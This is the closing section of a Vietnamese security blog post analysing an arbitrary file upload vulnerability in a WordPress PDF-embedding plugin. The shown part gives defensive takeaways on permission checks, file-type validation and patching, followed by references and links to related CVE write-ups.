<h2 class="heading-element" id="key-takeaway"><span>Key Takeaway</span>
  <a href="#key-takeaway" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>Luôn kiểm tra quyền người dùng (<code>current_user_can</code>) trước khi thực hiện upload qua AJAX.</li>
<li>Luôn xác thực kiểu/MIME của file (<code>wp_check_filetype</code> / whitelist) trước khi lưu.</li>
<li>Cập nhật plugin nhanh chóng khi có bản vá; rà soát file upload và log sau khi phát hiện lỗi.</li>
<li>Áp dụng nguyên tắc ít quyền nhất (least privilege) và giám sát hành vi bất thường trong media/uploads.</li>
</ul>
<h2 class="heading-element" id="references"><span>References</span>
  <a href="#references" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html"target="_blank" rel="external nofollow noopener noreferrer">Arbitrary File Upload</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/embed-pdf-wpforms/vulnerability/wordpress-embed-pdf-for-wpforms-plugin-1-1-5-authenticated-subscriber-arbitrary-file-upload-vulnerability"target="_blank" rel="external nofollow noopener noreferrer">WordPress Embed PDF for WPForms Plugin &lt;= 1.1.5 is vulnerable to Arbitrary File Upload</a></p></div><hr class="awesome-hr" />
    <h2 id="see-also">Nội dung liên quan</h2>
    <ul><li>
          <a href="/vi/posts/2025-11-05-cve-2025-10147/" title="CVE-2025-10147 Analysis &amp; POC">CVE-2025-10147 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-04-cve-2025-62065/" title="CVE-2025-62065 Analysis &amp; POC">CVE-2025-62065 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-03-cve-2025-2940/" title="CVE-2025-2940 Analysis &amp; POC">CVE-2025-2940 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-02-cve-2025-1043/" title="CVE-2025-1043 Analysis &amp; POC">CVE-2025-1043 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-01-cve-2025-52713/" title="CVE-2025-52713 Analysis &amp; POC">CVE-2025-52713 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-31-cve-2025-60161/" title="CVE-2025-60161 Analysis &amp; POC">CVE-2025-60161 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-30-cve-2025-11128/" title="CVE-2025-11128 Analysis &amp; POC">CVE-2025-11128 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-28-cve-2025-6851/" title="CVE-2025-6851 Analysis &amp; POC">CVE-2025-6851 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-08-cve-2025-9816/" title="CVE-2025-9816 Analysis &amp; POC">CVE-2025-9816 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-29-cve-2025-12136/" title="CVE-2025-12136 Analysis &amp; POC">CVE-2025-12136 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod"><span title="Cập nhật ngày 2025-11-06 19:00:00">Cập nhật ngày 2025-11-06&nbsp;</span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/vi/posts/2025-11-06-cve-2025-10647/index.md" title="Đọc với định dạng Markdown" class="link-to-markdown">Đọc với định dạng Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-11-06-CVE-2025-10647/index.vi.md?plain=1" title="Xem mã nguồn"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">Xem mã nguồn</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts/2025-11-06-CVE-2025-10647/index.vi.md" title="Chỉnh sửa trang này"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Chỉnh sửa trang này</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20CVE-2025-10647&#43;Analysis&#43;%26&#43;POC&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cCVE-2025-10647&#43;Analysis&#43;%26&#43;POC%7c%0A%7cURL%7chttp://localhost:1313/vi/posts/2025-11-06-cve-2025-10647/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-11-06-CVE-2025-10647/index.vi.md?plain=1%7c" title="Báo cáo lỗi"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Báo cáo lỗi</a></span><span><a href="vscode://file//home/w41bu1/Desktop/w41bu1.github.io/content/posts/2025-11-06-CVE-2025-10647/index.vi.md" title="Mở trong trình chỉnh sửa"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Mở trong trình chỉnh sửa</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="twitter" data-url="http://localhost:1313/vi/posts/2025-11-06-cve-2025-10647/" data-title="CVE-2025-10647 Analysis &amp; POC" data-hashtags="analyst,plugin,arbitrary file upload"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/posts/2025-11-06-cve-2025-10647/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/vi/posts/2025-11-06-cve-2025-10647/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/posts/2025-11-06-cve-2025-10647/" data-title="CVE-2025-10647 Analysis &amp; POC"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/vi/tags/analyst/" class="post-tag" title="Nhãn - Analyst">Analyst</a><a href="/vi/tags/plugin/" class="post-tag" title="Nhãn - Plugin">Plugin</a><a href="/vi/tags/arbitrary-file-upload/" class="post-tag" title="Nhãn - Arbitrary File Upload">Arbitrary File Upload</a></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
    </section>
  </div><div class="post-nav"><a href="/vi/posts/2025-11-05-cve-2025-10147/" class="post-nav-item" rel="prev" title="CVE-2025-10147 Analysis &amp; POC"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-10147 Analysis &amp; POC</a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Nội dung"><h2 class="toc-title">Nội dung&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
              <a href="github.com/w41bu1">Bui Van Y</a></span><span class="license footer-divider">w41bu1</span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='Tổng khách truy cập'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Tổng lượt truy cập'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div><div class="footer-line beian"><span class="gov"><i class="fa-solid fa-user-secret"></i></span><span class="icp footer-divider"><i class="fa-solid fa-bug"></i></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Lên trên"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">Trang web này hoạt động tốt nhất khi JavaScript được kích hoạt.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/vi/posts/2025-11-06-cve-2025-10647/config/page.js" defer></script><script src="/js/lib/mermaid.js" type="module"></script><script src="/js/theme.min.js" defer></script><script src="/js/flyfish.min.js" defer></script></body>
</html>
